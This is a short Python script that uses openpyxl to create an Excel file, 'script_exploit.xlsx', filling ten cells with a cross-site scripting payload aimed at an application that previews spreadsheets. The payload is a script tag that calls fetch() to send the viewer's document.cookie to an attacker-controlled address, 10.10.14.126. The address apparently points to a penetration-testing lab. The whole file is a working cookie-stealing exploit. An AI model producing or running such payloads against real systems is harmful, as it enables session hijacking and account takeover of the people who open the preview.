import openpyxl

# Create a new workbook
wb = openpyxl.Workbook()
sheet = wb.active

# Your specific payload
attacker_url = "http://10.10.14.126/log"
payload = f"<script>fetch('{attacker_url}?c=' + document.cookie)</script>"

# Fill the first 5 rows and 2 columns to make sure the "preview" catches it
for row in range(1, 6):
    for col in range(1, 3):
        sheet.cell(row=row, column=col).value = payload

# Save the file
file_name = "script_exploit.xlsx"
wb.save(file_name)

print(f"[+] '{file_name}' created with payload: {payload}")